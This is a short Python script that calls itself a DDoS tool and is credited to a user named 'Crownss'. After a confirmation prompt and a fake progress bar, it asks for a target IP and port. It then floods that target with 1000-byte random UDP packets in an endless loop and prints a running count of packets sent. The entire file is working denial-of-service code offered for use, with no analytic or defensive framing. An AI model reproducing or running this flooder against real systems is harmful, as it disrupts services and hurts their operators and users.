import sys
import os
import time
import socket
import random

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############
print (now)
test = input("this is DDoS tool are you sure want to use ? [Y/N]")
if (test == "Y"):
	pass
elif (test == "N"):
	exit()
elif (test == "y"):
	pass
elif (test == "n"):
	exit()
else:
	exit()
os.system("echo tekan enter untuk lanjut")
input()
#############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1000)
#############

os.system("clear")
print("\n")
print("Created By : Crownss")
print("\n")
ip = input("IP Target : ")
port = int(input("Port      : "))

os.system("clear")
for i in range(50):
	sys.stdout.write('\r')
	sys.stdout.write("[%-50s] %d%%" % ('#'*i, 2*i))	
	sys.stdout.flush()
	time.sleep(0.50)
	print("\n")
	os.system("clear")
	print("wait till 100% and automaticaly DDoS")

	
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 100
     print ("Sent %s packet to %s throught port: %s"%(sent, ip, port))
     print ("\n")
     print ("A cat is fine to desudesudesudesu~")
     if port == 65534:
       port = 80
